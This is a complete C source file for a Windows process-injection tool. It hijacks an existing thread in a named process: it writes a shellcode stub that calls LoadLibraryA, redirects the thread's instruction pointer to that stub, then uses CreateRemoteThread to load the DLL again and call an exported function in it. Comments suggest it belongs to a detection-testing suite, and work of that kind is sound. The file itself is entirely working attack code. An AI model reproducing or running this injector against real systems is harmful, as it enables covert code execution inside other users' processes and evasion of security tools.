/* Thread Execution Hijacking (Thread Context Injection)
 *
 * Clean single-file implementation.
 */

#include "../common/common.h"
#include <string.h>

// HijackThread: attempt to hijack an existing thread in a target process by
// allocating a small remote stub that calls LoadLibraryA(remotePath) and
// then returns to the original RIP. Falls back to CreateRemoteThread+LoadLibraryA
// and finally attempts to call exported TestFunction in the loaded module.
BOOL HijackThread(DWORD pid, DWORD tid) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID pRemoteDllPath = NULL;
    LPVOID pRemoteStub = NULL;
    FILE *injLog = NULL;
    CONTEXT ctx = {0};
    BOOL success = FALSE;
    BOOL threadSuspended = FALSE;

    /* Determine DLL path relative to this injector's folder so users can
       copy EXE+DLL to a test machine and run without changing code. */
    char exePathBuf[MAX_PATH] = {0};
    char localDllPath[MAX_PATH] = {0};
    if (GetModuleFileNameA(NULL, exePathBuf, MAX_PATH) > 0) {
        char *slash = strrchr(exePathBuf, '\\');
        if (slash) { *(slash+1) = '\0'; snprintf(localDllPath, MAX_PATH, "%ssample_dll.dll", exePathBuf); }
    }
    if (localDllPath[0] == '\0') strncpy(localDllPath, "sample_dll.dll", MAX_PATH-1);
    SIZE_T dllPathLen = strlen(localDllPath) + 1;

    // Open target process with required rights
    hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD, FALSE, pid);
    CHECK_HANDLE(hProcess, "Failed to open process");

    // Write DLL path into remote process
    pRemoteDllPath = VirtualAllocEx(hProcess, NULL, dllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    CHECK_HANDLE(pRemoteDllPath, "Failed to allocate remote memory for DLL path");
    CHECK_BOOL(WriteProcessMemory(hProcess, pRemoteDllPath, localDllPath, dllPathLen, NULL), "Failed to write remote DLL path");

    // Prepare a tiny x64 stub:
    unsigned char stubTemplate[] = {
        0x48,0xB9, 0,0,0,0,0,0,0,0,   // mov rcx, imm64
        0x48,0xB8, 0,0,0,0,0,0,0,0,   // mov rax, imm64
        0xFF,0xD0,                   // call rax
        0x48,0xB8, 0,0,0,0,0,0,0,0,   // mov rax, imm64 (orig RIP)
        0xFF,0xE0                    // jmp rax
    };
    SIZE_T stubSize = sizeof(stubTemplate);

    // Patch pointer to remote DLL path (offset 2)
    UINT64 remoteDllAddr = (UINT64)(uintptr_t)pRemoteDllPath;
    memcpy(&stubTemplate[2], &remoteDllAddr, sizeof(UINT64));

    // Resolve local LoadLibraryA address and patch it into the stub (offset 12)
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibraryA = hKernel32 ? GetProcAddress(hKernel32, "LoadLibraryA") : NULL;
    if (!pLoadLibraryA) { LOG_ERROR("Failed to resolve LoadLibraryA"); goto cleanup; }
    UINT64 loadLibAddr = (UINT64)(uintptr_t)pLoadLibraryA;
    memcpy(&stubTemplate[12], &loadLibAddr, sizeof(UINT64));

    // Allocate remote stub (executable)
    pRemoteStub = VirtualAllocEx(hProcess, NULL, stubSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    CHECK_HANDLE(pRemoteStub, "Failed to allocate remote stub memory");

    // Open an injector log next to the exe for visibility on detection machines
    char logPath[MAX_PATH] = {0};
    if (exePathBuf[0] != '\0') {
        snprintf(logPath, MAX_PATH, "%s04_hijack_log.txt", exePathBuf);
    } else {
        char tmpExe[MAX_PATH] = {0};
        if (GetModuleFileNameA(NULL, tmpExe, MAX_PATH) > 0) {
            char *slash = strrchr(tmpExe, '\\');
            if (slash) { *(slash+1) = '\0'; snprintf(logPath, MAX_PATH, "%s04_hijack_log.txt", tmpExe); }
        }
    }
    if (logPath[0] == '\0') strncpy(logPath, "04_hijack_log.txt", MAX_PATH-1);
    injLog = fopen(logPath, "a");
    if (injLog) { SYSTEMTIME st; GetLocalTime(&st); fprintf(injLog, "[%04d-%02d-%02d %02d:%02d:%02d] Hijack PID=%d TID=%d\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, pid, tid); fflush(injLog); }

    // If no thread id provided, try to find a thread in the target process
    if (tid == 0) {
        tid = GetThreadIdByProcessId(pid);
        if (tid == 0) { LOG_ERROR("No thread id available"); goto cleanup; }
        LOG_SUCCESS("Selected TID=%d", tid);
    }

    // Open target thread with required rights
    hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tid);
    if (!hThread) { LOG_ERROR("OpenThread failed (TID=%d) Error=%lu", tid, GetLastError()); if (injLog) { fprintf(injLog, "OpenThread FAILED TID=%d Error=%lu\n", tid, GetLastError()); fflush(injLog); } goto cleanup; }

    // Suspend the thread and capture its context
    if (SuspendThread(hThread) == (DWORD)-1) { LOG_ERROR("SuspendThread failed Error=%lu", GetLastError()); if (injLog) { fprintf(injLog, "SuspendThread FAILED TID=%d Error=%lu\n", tid, GetLastError()); fflush(injLog); } goto cleanup; }
    threadSuspended = TRUE;

    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &ctx)) { LOG_ERROR("GetThreadContext failed Error=%lu", GetLastError()); if (injLog) { fprintf(injLog, "GetThreadContext FAILED TID=%d Error=%lu\n", tid, GetLastError()); fflush(injLog); } goto cleanup; }

    // Patch original RIP into stub (offset 24)
    UINT64 origRip = 0;
#ifdef _WIN64
    origRip = (UINT64)ctx.Rip;
#else
    origRip = (UINT64)ctx.Eip;
#endif
    SIZE_T origRipOffset = 24;
    memcpy(&stubTemplate[origRipOffset], &origRip, sizeof(UINT64));

    // Write remote stub into target process
    CHECK_BOOL(WriteProcessMemory(hProcess, pRemoteStub, stubTemplate, stubSize, NULL), "Failed to write remote stub");
    LOG_SUCCESS("Remote stub written (origRip=0x%llx)", (unsigned long long)origRip);
    if (injLog) { fprintf(injLog, "Remote stub written origRip=0x%llx\n", (unsigned long long)origRip); fflush(injLog); }

    // Redirect thread to our stub
#ifdef _WIN64
    ctx.Rip = (DWORD64)pRemoteStub;
    LOG_SUCCESS("New RIP: 0x%llx", ctx.Rip);
#else
    ctx.Eip = (DWORD)pRemoteStub;
    LOG_SUCCESS("New EIP: 0x%x", ctx.Eip);
#endif

    if (!SetThreadContext(hThread, &ctx)) { LOG_ERROR("SetThreadContext failed Error=%lu", GetLastError()); if (injLog) { fprintf(injLog, "SetThreadContext FAILED TID=%d Error=%lu\n", tid, GetLastError()); fflush(injLog); } goto cleanup; }
    LOG_SUCCESS("Thread context modified");

    if (ResumeThread(hThread) == (DWORD)-1) { LOG_ERROR("ResumeThread failed"); goto cleanup; }
    threadSuspended = FALSE;
    success = TRUE;

    // Give the target a moment to execute the stub
    Sleep(200);

    // Fallback: classic CreateRemoteThread(LoadLibraryA) if needed
    if (success) {
        HMODULE hLocalKernel32 = GetModuleHandleA("kernel32.dll");
        FARPROC pLocalLoadLibraryA = NULL;
        if (hLocalKernel32) pLocalLoadLibraryA = GetProcAddress(hLocalKernel32, "LoadLibraryA");
        if (pLocalLoadLibraryA) {
            // find kernel32 base in remote process
            MODULEENTRY32 me32 = {0}; me32.dwSize = sizeof(me32);
            HANDLE hModSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
            UINT64 remoteKernel32Base = 0;
            if (hModSnap != INVALID_HANDLE_VALUE) {
                if (Module32First(hModSnap, &me32)) {
                    do { if (_stricmp(me32.szModule, "kernel32.dll") == 0) { remoteKernel32Base = (UINT64)(uintptr_t)me32.modBaseAddr; break; } } while (Module32Next(hModSnap, &me32));
                }
                CloseHandle(hModSnap);
            }

            if (remoteKernel32Base) {
                UINT64 localKernel32Base = (UINT64)(uintptr_t)hLocalKernel32;
                UINT64 offset = (UINT64)(uintptr_t)pLocalLoadLibraryA - localKernel32Base;
                UINT64 remoteLoadLibraryA = remoteKernel32Base + offset;
                LOG_INFO("Fallback CreateRemoteThread remote LoadLibraryA: 0x%llx", remoteLoadLibraryA);
                HANDLE hCRT = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteLoadLibraryA, pRemoteDllPath, 0, NULL);
                if (injLog) { fprintf(injLog, "Fallback CreateRemoteThread LoadLibraryA addr=0x%llx thread=0x%p\n", remoteLoadLibraryA, hCRT); fflush(injLog); }
                if (hCRT && hCRT != INVALID_HANDLE_VALUE) {
                    WaitForSingleObject(hCRT, INFINITE);
                    DWORD exitCode = 0; if (GetExitCodeThread(hCRT, &exitCode)) { LOG_SUCCESS("CreateRemoteThread exit code: %u", exitCode); if (injLog) { fprintf(injLog, "CreateRemoteThread exit=%u\n", exitCode); fflush(injLog); } }

                    BOOL found = FALSE; UINT64 remoteModuleBase = 0;
                    HANDLE hModSnap2 = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
                    if (hModSnap2 != INVALID_HANDLE_VALUE) {
                        MODULEENTRY32 me = {0}; me.dwSize = sizeof(me);
                        if (Module32First(hModSnap2, &me)) {
                            do { if (_stricmp(me.szModule, "sample_dll.dll") == 0) { found = TRUE; remoteModuleBase = (UINT64)(uintptr_t)me.modBaseAddr; break; } } while (Module32Next(hModSnap2, &me));
                        }
                        CloseHandle(hModSnap2);
                    }

                    if (found) {
                        LOG_SUCCESS("sample_dll.dll loaded at 0x%llx", remoteModuleBase);
                        if (injLog) { fprintf(injLog, "sample_dll.dll loaded at 0x%llx\n", remoteModuleBase); fflush(injLog); }
                        HMODULE hLocalMod = LoadLibraryA(localDllPath);
                        if (hLocalMod) {
                            FARPROC pLocalTest = GetProcAddress(hLocalMod, "TestFunction");
                            if (pLocalTest) {
                                UINT64 localBase = (UINT64)(uintptr_t)hLocalMod;
                                UINT64 offsetFunc = (UINT64)(uintptr_t)pLocalTest - localBase;
                                UINT64 remoteFunc = remoteModuleBase + offsetFunc;
                                LOG_INFO("Attempt remote TestFunction at 0x%llx", remoteFunc);
                                HANDLE hCall = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteFunc, NULL, 0, NULL);
                                if (hCall && hCall != INVALID_HANDLE_VALUE) { WaitForSingleObject(hCall, 5000); CloseHandle(hCall); LOG_SUCCESS("Remote TestFunction invoked"); if (injLog) { fprintf(injLog, "Remote TestFunction invoked at 0x%llx\n", remoteFunc); fflush(injLog); } }
                                else { LOG_WARNING("Failed to start remote TestFunction"); if (injLog) { fprintf(injLog, "Failed remote TestFunction at 0x%llx\n", remoteFunc); fflush(injLog); } }
                            }
                            FreeLibrary(hLocalMod);
                        }
                    } else {
                        LOG_WARNING("sample_dll.dll not found after CreateRemoteThread"); if (injLog) { fprintf(injLog, "sample_dll.dll not found after CreateRemoteThread\n"); fflush(injLog); }
                    }
                    CloseHandle(hCRT);
                } else {
                    LOG_WARNING("CreateRemoteThread for LoadLibraryA failed"); if (injLog) { fprintf(injLog, "CreateRemoteThread failed\n"); fflush(injLog); }
                }
            }
        }
    }

cleanup:
    if (threadSuspended && hThread) ResumeThread(hThread);
    if (pRemoteStub && hProcess) VirtualFreeEx(hProcess, pRemoteStub, 0, MEM_RELEASE);
    if (pRemoteDllPath && hProcess) VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
    SAFE_CLOSE_HANDLE(hThread);
    SAFE_CLOSE_HANDLE(hProcess);
    if (injLog) fclose(injLog);
    return success;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        PrintUsage(argv[0], "<process_name> [thread_id]", "notepad.exe  or  notepad.exe 1234");
        return 1;
    }
    const char *processName = argv[1];
    DWORD tid = 0;
    if (argc >= 3) tid = (DWORD)atoi(argv[2]);
    LOG_INFO("Thread Execution Hijacking Technique");
    LOG_INFO("Target Process: %s", processName);
    if (tid) LOG_INFO("Target Thread ID: %d", tid);
    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) return 1;
    LOG_SUCCESS("Found process with PID: %d", pid);
    return HijackThread(pid, tid) ? 0 : 1;
}

